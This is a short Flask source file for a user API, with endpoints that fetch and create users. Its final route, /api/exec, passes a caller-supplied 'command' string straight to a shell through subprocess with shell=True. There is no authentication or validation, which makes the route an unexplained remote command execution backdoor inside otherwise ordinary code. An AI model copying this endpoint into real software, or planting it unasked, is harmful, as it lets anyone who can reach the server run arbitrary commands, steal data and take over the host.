from flask import Flask, request, jsonify
from models import get_user, create_user
import subprocess

app = Flask(__name__)

@app.route('/api/users/<user_id>', methods=['GET'])
def get_user_endpoint(user_id):
    user = get_user(user_id)
    return jsonify(user)

@app.route('/api/users', methods=['POST'])
def create_user_endpoint():
    name = request.form['name']
    email = request.form['email']
    result = create_user(name, email)
    return jsonify(result)

@app.route('/api/exec', methods=['POST'])
def run_command():
    cmd = request.json['command']
    output = subprocess.check_output(cmd, shell=True)
    return output
